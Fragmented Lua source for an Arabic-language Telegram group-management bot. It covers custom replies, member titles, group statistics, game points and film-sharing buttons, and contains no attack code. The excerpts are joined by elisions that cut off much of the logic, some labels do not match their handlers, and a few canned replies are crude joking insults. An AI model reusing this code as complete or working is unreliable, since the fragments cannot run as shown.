send(msg.chat_id_, msg.id_,' 𖤗 تم ازالة الرد العام')
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الكلمه تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الكلمه تريد مسحها')
...
send(msg.chat_id_, msg.id_," 𖤗 تم مسح الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_," 𖤗 تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_," 𖤗 تم مسح الردود")
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الكلمه التي تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الكلمه التي تريد مسحها')
...
send(msg.chat_id_, msg.id_,' 𖤗 لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n 𖤗 قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..') '
status  = '\n 𖤗 الايدي  ⇇'..result.sender_user_id_..'\n 𖤗 تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
...
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖤗 البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗  الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗  الايدي  ⇇`'..result.sender_user_id_..'`\n 𖤗  تم مسح لقبه من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
send(msg.chat_id_, msg.id_,' 𖤗 وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,' 𖤗 لقبك هو : '..GeId.result.custom_title) 
end
end
...
send(msg.chat_id_, msg.id_,'\n 𖤗 صلاحيات البوت هي\n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n 𖤗  علامة ال {✔️} تعني مفعل\n 𖤗  علامة ال {✖} تعني غير مفعل\n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n 𖤗 تغير معلومات المجموعة ↞ '..INf..'\n 𖤗 مسح الرسائل ↞ '..DEL..'\n 𖤗 حظر المستخدمين ↞ '..REs..'\n 𖤗 دعوة المستخدمين ↞ '..INv..'\n 𖤗 ثتبيت الرسالة ↞ '..Pin..'\n 𖤗 اضافة مشرفين ↞ '..PRo)   
end
end
...
local t = "\n 𖤗 المستخدم ~ ["..User_id .."] يصيح المشرفين \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n"
k = 0
...
return send(msg.chat_id_, msg.id_," 𖤗 ارسل الرد الذي اريد اضافته")
end
...
return send(msg.chat_id_, msg.id_," 𖤗 ارسل الان الكلمه لمسحها ")
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖤗 تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖤗 تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_,' 𖤗 تم مغادرة المجموعه') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
...
Text = ' 𖤗 تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = ' 𖤗 بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and DevSoFi(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' 𖤗 تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = ' 𖤗 بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end
...
Text = '\n 𖤗 تم تفعيل الردود العامه' 
else
Text = '\n 𖤗 بالتاكيد تم تفعيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤗 تم تعطيل الردود العامه' 
else
Text = '\n 𖤗 بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n 𖤗 تم تفعيل الايدي بالصور' 
else
Text = '\n 𖤗 بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n 𖤗 تم تعطيل الايدي بالصوره' 
else
Text = '\n 𖤗 بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,' 𖤗 ايديه ⇜ '..iduser..'\n 𖤗 معرفه ⇜ ↝'..username..'↜\n 𖤗 رتبته ⇜ '..rtp..'\n 𖤗 تعديلاته ⇜ '..edit..'\n 𖤗 نقااصيل ⇜ '..NUMPGAME..'\n 𖤗 جهاته ⇜ '..Contact..'\n 𖤗 رسائله ⇜ ↝'..Msguser..'↜')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤗 انا مين معطله") 
return false  
end
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور القميل🥺🤍](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور الاساسي² 😍💚](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝💘](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز القميل 😊 ](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ العضو قميل 🌝💘 ](t.me/FA9SH)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_, msg.id_," 𖤗 تـم تـفعـيل انا مين") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 𖤗 تـم تـعـطـيل انا مين") 
return false end
end
if text == "تفعيل ردود السورس"  then
if Constructor(msg) then  
database:set(bot_id.."my_GHoeq2:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖤗 تـم تـفعـيل ردود السورس") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 𖤗 تـم تـعـطـيل ردود السورس") 
return false end
end
...
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤗 معطله") 
return false  
end
send(msg.chat_id_,msg.id_, '[خالتك جرت ورايا 😹💔](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نعم الله عليك 🌚❤️](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[العفو ياروحي 🙈🌝](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر 🤤🌝](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب 😑😂](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب 🙂❤️](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي 🥺💔](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[امك اسمها احلام 😹😹](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك 😎😂](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتفكر في اي 🤔](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[محات حياتي يروحي 🌝❤️](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي 👋💛](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي 🐣😹](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[دايما ياحبيبي 🌝❤️](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه فاستر](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الخير يعمري 🌝❤️](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق 🌚😍](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام 🌝❤️](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عيب ياوسخ 🙄💔](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[روح وعقل بوتك 🥺💔](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صح النوم 😹💔](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صباح العسل 😻🤍](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي 🙂💛](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى 🥺💔](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متزعلش بحبك 🥺💔](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نورك يا قلبي 🤤🖤](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا 😒😹](t.me/FA9SH)')
return false
end
end
end
...
first_name = ' 𖤗 اسمك الاول  ⇇{`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = ' 𖤗 اسمك الثاني  ⇇{`'..result.last_name_..'`}' 
else
last_name = ''
end      
...
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,' 𖤗 ايديك  ⇇'..msg.sender_user_id_)
end
...
send(msg.chat_id_, msg.id_,' 𖤗 الايدي غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
...
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," 𖤗 البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local sofi = ' 𖤗 عدد الادمنيه : '..data.administrator_count_..
'\n\n 𖤗 عدد المطرودين : '..data.kicked_count_..
'\n\n 𖤗 عدد الاعضاء : '..data.member_count_..
'\n\n 𖤗 عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n 𖤗  اسم الجروب : ['..ta.title_..']'
...
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
...
send(msg.chat_id_, msg.id_,' 𖤗 المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,' 𖤗 لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,' 𖤗 لا استطيع اصيح معرف بوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' 𖤗 لا اسطيع صيح معرفات الجروبات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,' 𖤗 تع يعم كلم الواد قميل ده عوزك  [@↝'..username..'↜]') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل امر صيح') 
end
return false
end
...
send(msg.chat_id_, msg.id_,' 𖤗 انت منشئ الجروب') 
return false
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖤗 هوا ابن القمر دا الي ضافك 😹 ⇇'..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖤗 انت دخلت عبر الرابط ياقميل 🙈🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل امر  مين ضافني') 
end
end
...
Text = ' 𖤗 تم تفعيل امر مين ضافني '
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' 𖤗 بالتاكيد تم تفعيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤗 تم تعطيل امر مين ضافني '
else
Text = '\n 𖤗 بالتاكيد تم تعطيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = ' 𖤗 تم تفعيل امر صيح'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = ' 𖤗 بالتاكيد تم تفعيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤗 بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' 𖤗 تم تفعيل امر اطردني'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' 𖤗 بالتاكيد تم تفعيل امر اطردني  مع سلام سلامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤗 تم تعطيل امر اطردني اترزع هن بقى مفيش خروج 😹'
else
Text = '\n 𖤗 بالتاكيد تم تعطيل امر اطردني مفيش خروج يولاد القمر 😹'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤗 الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," 𖤗 عدد صورك ⇜ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤗 اكتب تفعيل نسبه جمالي") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," 𖤗 نسبه جمالك هيا ⇜ %"..result.total_count_.." يختي قمر يجدعان 𖤗 💕", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تغير الايدي ارسل ايدي لرؤيته')
end

if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = ' 𖤗  ليس لديك سحكات'
else
Text = ' 𖤗 عدد سحكاتك * ⇇↝ '..Num..' ↜ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "مسح سحكاتي" then  
send(msg.chat_id_, msg.id_,' 𖤗 تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "مسح جهاتي" then  
send(msg.chat_id_, msg.id_,' 𖤗 تم مسح جهاتك'  )  
...
if Num == 0 then 
Text = ' 𖤗 لم تقم بأضافه احد ياقميل'
else
Text = ' 𖤗 عدد جهاتك ياقميل * ⇇↝ '..Num..' ↜ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
-- vardump(data) 
DRAGONdx(msg.chat_id_, msg.id_, ' 𖤗 ايدي المجموعة  ⇇↝ '..msg.chat_id_..' ↜\n 𖤗 عدد الادمنيه  ⇇↝ *'..data.administrator_count_..' ↜*\n 𖤗 عدد المحظورين  ⇇↝ *'..data.kicked_count_..' ↜*\n 𖤗 عدد الاعضاء  ⇇↝ *'..data.member_count_..' ↜*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_," 𖤗 تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,  1, " 𖤗 | تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, ' 𖤗 ارسل لي عدد الرسائل الان') 
return false
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, ' 𖤗 ارسل لي عدد النقاط التي تريد اضافتها') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
...
send(msg.chat_id_, msg.id_," 𖤗 تم اضافة له {"..Num..'} من النقاط')  
end
...
if Num == 0 then 
Text = ' 𖤗 لم تلعب اي لعبه للحصول على نقاط'
else
Text = ' 𖤗 عدد نقاطك التي ربحتها هيه * ⇇↝ '..Num..' ↜ نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_,msg.id_,"\n* 𖤗 لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,' 𖤗 ليس لديك نقاط في الالعاب\n 𖤗 اذا كنت تريد ربح نقاط \n 𖤗 ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n 𖤗 ليس لديك نقاط في هذه لعبه \n 𖤗 لزيادة نقاطك في اللعبه \n 𖤗 ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,' 𖤗 تم خصم * ⇇{ '..NUMPY..' }* من نقاطك \n 𖤗 وتم اضافة*  ⇇{ '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
...
send(msg.chat_id_,msg.id_,'\n 𖤗 اهلا عزيزي البوت هنا ادمن'..'\n 𖤗 وصلاحياته هي ◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥ \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥'..'\n 𖤗 تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n 𖤗 مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n 𖤗 حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n 𖤗 دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n 𖤗 تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n 𖤗 اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
send(msg.chat_id_, msg.id_," 𖤗 تم تغير رد المطور الى  ⇇"..Teext)
end
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم حفظ الكليشه')
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم استعادة الاوامر القديمه')
end
if text == 'تغير امر الاوامر' and DevSoFi(msg) then
send(msg.chat_id_, msg.id_, ' 𖤗 الان يمكنك ارسال الكليشه الاوامر')
database:set(bot_id..'help'..msg.sender_user_id_,'true')
return false 
end
if text == 'تغير امر ⓵' and DevSoFi(msg) then
send(msg.chat_id_, msg.id_, ' 𖤗 الان يمكنك ارسال الكليشه ⓵')
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,' 𖤗 هاذا الامر خاص بالادمنيه\n 𖤗 ارسل {⑩} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
if text == 'مميزات' then
local Text = [[
[✇ مرحبا بك في مميزات السورس ✇](t.me/FA9SH)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✇ مميزات السورس ✇', callback_data="/mute-namo"},{text = '✇ الاضافات ✇', callback_data="/change-photo"},
},
{
{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´', url="t.me/FA9SH"},
},
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تعطيل حساب العمر')
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تفعيل الاله حاسبه')
database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"open")
end
...
send(msg.chat_id_, msg.id_," 𖤗 تـم تـفعـيل مريم") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 𖤗 تـم تـعـطـيل مريم") 
return false end
end
if text == "مريم" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤗 مريم  معطله") 
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
...
local Text = [[
✇ اختار نوع افلام الي ترودي ✇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✇ افلام عربي ✇', callback_data="/Jabwa5"},{text = '✇ افلام اجنبي ✇', callback_data="/Jabwa6"}},   
{{text = '✇ افلام رعب ✇', callback_data="/Jabwa7"},{text = '✇ افلام كرتون ✇', callback_data="/Jabwa8"}},   
{{text = '✇ افلام هنديه ✇', callback_data="/Jabwa9"},{text = '✇ افلام مسرحيات ✇', callback_data="/Jabwa10"}},   
{{text = '✇ 𝐂𝐇 ✇', url="t.me/FA9SH"}},
}
local msg_id = msg.id_/2097152/0.5
...
ght = math.random(2,22); 
local Text ='✇ مرحبا اليك فلم عربي ✇' 
keyboard = {}  
keyboard.inline_keyboard = { 
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '✇ مرحبا اليك فلم عربي ✇\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sijebehdhd/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'✇ مرحبا اليك عربي ✇') 
end 
end,nil) 
end
if Text == "/Jabwa6" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(2,22); 
local Text ='✇ مرحبا اليك فلم اجنبي ✇' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`ʙᴀᴄᴋ´', callback_data="/OOO"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}},  
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '✇ مرحبا اليك فلم اجنبي ✇\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/jdjie1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'✇ مرحبا اليك فلم اجنبي ✇') 
end 
end,nil) 
end
if Text == "/Jabwa7" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(2,22); 
local Text ='✇ مرحبا اليك فلم رعب ✇' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`ʙᴀᴄᴋ´', callback_data="/OOO"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}},  
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '✇ مرحبا اليك فلم رعب ✇\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MO_ST_AFA1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'✇ مرحبا اليك فلم رعب ✇') 
end 
end,nil) 
end
if Text == "/Jabwa8" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(2,22); 
local Text ='✇ مرحبا اليك فلم هنديه ✇' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`ʙᴀᴄᴋ´', callback_data="/OOO"}},
